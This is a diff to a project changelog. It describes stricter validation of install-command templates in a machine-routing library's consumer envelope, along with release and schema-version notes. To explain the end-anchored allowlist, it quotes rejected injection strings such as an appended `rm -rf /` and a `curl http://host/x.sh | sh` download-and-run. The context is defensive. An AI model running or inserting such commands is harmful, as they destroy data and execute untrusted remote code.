@@ -43,17 +43,47 @@ project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   `iapp-knowledge`'s adapter (`src/machines.ts`, adapter contract version 1)
   reports `unsupported_contract_version` and returns `null` for topology, route
   and workspace payloads whose `schema_version` exceeds 1 — a far larger break
-  than the one hook it does not read. No known consumer validates the
-  `browserplan_fleet` envelope.
-- **This release only expands validation; it never narrows it.**
-  `validateMachinesConsumerEnvelope` accepts an `app_install_update` template that
-  either starts with `bun install -g @hasna/open-chrome@` (so a caller may pin
-  `…@0.1.0` rather than track `latest`) **or** exactly equals the legacy checkout
-  template, so a cached pre-0.2.3 payload keeps validating. Templates that are
-  neither — including git-based rewrites such as `git fetch && git reset --hard`,
-  `git -C <dir> pull` and `git clone` — are rejected. This is an allowlist of
-  install shapes, not a `git pull` phrase denylist, which would have been
-  trivially evadable.
+  than the one hook it does not read. A per-envelope version would not help
+  either: `schema_version` is a single global constant stamped on all 28
+  envelopes, and no consumer gates on a per-envelope one.
+
+  No consumer validates the `browserplan_fleet` envelope: `open-loops` uses only
+  `discoverMachineTopology` and `resolveMachineRoute`, `open-dispatch` loads the
+  consumer purely for route resolution, and `iapp-knowledge` declares
+  `validateMachinesConsumerEnvelope` as a one-parameter optional capability it
+  never invokes. `hasna/identities` documents reading this envelope
+  (`docs/browserplan.md`) but does not consume it.
+
+### Release story
+
+- This change **cannot ship from `package.json` at `0.2.2`** — that version is
+  already published and `scripts/verify-release.ts` correctly refuses. A version
+  bump is required before publishing, and the skew above is only closed once
+  consumers move past it; merging alone does not close it.
+- **Validation expands for every template any released version actually emits, and
+  narrows only for hand-edited variants.** `validateMachinesConsumerEnvelope`
+  accepts an `app_install_update` template that is either `bun install -g
+  @hasna/open-chrome@` followed by a bare npm version or dist-tag — so a caller may
+  pin `…@0.1.0` rather than track `latest` — **or** exactly equals the legacy
+  checkout template, so a payload cached from any version up to 0.2.2 keeps
+  validating.
+
+  Precisely, and not overstated: the legacy arm is exact equality, so *modified*
+  legacy strings that 0.2.2 accepted are now refused — trailing or leading
+  whitespace, a dropped `--frozen-lockfile`, an added flag, or `origin main`
+  shortened to `origin`. No emitter produces those, and every template emitted by a
+  released version validates, but the rule is stricter than 0.2.2 for hand-edited
+  input rather than a pure superset of it.
+
+  The version suffix is **end-anchored**. That matters more than the prefix: a
+  prefix-only check accepts anything appended after a valid install — `…@latest &&
+  rm -rf /`, `…@latest; curl http://host/x.sh | sh`, `…@latest; cd d && git pull` —
+  and an empty version. Those are rejected, as are git-based rewrites
+  (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`). This is an
+  allowlist of command *shape*, not a `git pull` phrase denylist, which would have
+  been trivially evadable. It is not a trust check: a legitimate but
+  hostile-looking dist-tag such as `latest-evil` is within the npm tag charset and
+  is accepted.
 - Every other BrowserPlan surface is unchanged — owner ids, target name, machine
   ids, operation ids, stable surfaces — and
   `schemas/machines-consumer.schema.json` is byte-for-byte identical, because the
